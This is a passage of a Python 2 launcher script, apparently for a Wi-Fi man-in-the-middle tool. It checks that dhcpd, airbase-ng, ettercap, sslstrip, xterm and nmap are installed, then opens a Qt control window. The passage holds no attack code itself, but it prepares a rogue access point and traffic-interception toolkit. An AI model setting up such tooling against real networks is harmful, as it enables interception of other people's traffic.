                print("{-} nmap  --> [%sOFF%s]...      |"%(RED,ENDC))
                
        if m[a] == True:
            if a == 0:
                print("{+} dhcpd --> [%sOk%s]...       |"%(GREEN,ENDC))
            elif a == 1:
                print("{+} airbase-ng --> [%sOk%s]...  |"%(GREEN,ENDC))
            elif a == 2:
                print("{+} ettercap --> [%sOk%s]...    |"%(GREEN,ENDC))
            elif a == 3:
                print("{+} sslstrip --> [%sOk%s]...    |"%(GREEN,ENDC))
            elif a == 4:
                print("{+} Xterm  --> [%sOk%s]...      |"%(GREEN,ENDC))
            elif a == 5:
                print("{+} nmap  --> [%sOk%s]...       |"%(GREEN,ENDC))
    for k,g in enumerate(m):
        if m[k] == False:
            if k == 0:
                dhcp_install()
            if k == 1:
                print("{%s-%s} Pleace Necessary install %saircrack-ng%s"%(RED, ENDC,RED, ENDC))
            if k == 2:
                print("{%s-%s} Pleace Necessary install %settercap%s"%(RED, ENDC, RED, ENDC))
            if k == 3:
                print("{%s-%s} Pleace Necessary install %ssslstrip%s"%(RED, ENDC,RED, ENDC))
            if k == 4:
                print("{%s-%s} Pleace Necessary install %sxterm%s"%(RED, ENDC,RED, ENDC))
            if k == 5:
                print("{%s-%s} Pleace Necessary install %snmap%s"%(RED, ENDC,RED, ENDC))
    for c in m:
        if c == False:
            exit()
    print("{+} %sStarting GUI%s...         |"%(YELLOW,ENDC))
    print"============================="
    root = QApplication(sys.argv)
    app = frmControl(None)
    app.setWindowIcon(QIcon('Module/icon.ico'))
    app.center()
    app.show()
    root.exec_()
